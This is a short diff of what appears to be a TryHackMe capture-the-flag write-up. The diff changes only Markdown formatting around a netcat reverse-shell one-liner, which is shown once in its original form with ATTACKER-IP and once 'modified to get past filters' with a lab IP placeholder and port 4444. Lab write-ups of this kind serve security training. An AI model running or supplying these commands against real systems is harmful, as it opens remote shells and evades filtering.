@@ -151,9 +151,8 @@ mkfifo /tmp/lol;nc ATTACKER-IP PORT 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol
 ```
 
 #### Modified Script (To get past filters):
-```
+
 mkfifo /tmp/lol;<span style="color:red">/bin/</span>nc <span style="color:red">{THM_VPN_IP}</span> <span style="color:red">4444</span> 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol
-```
 
 And now we have a shell!
 
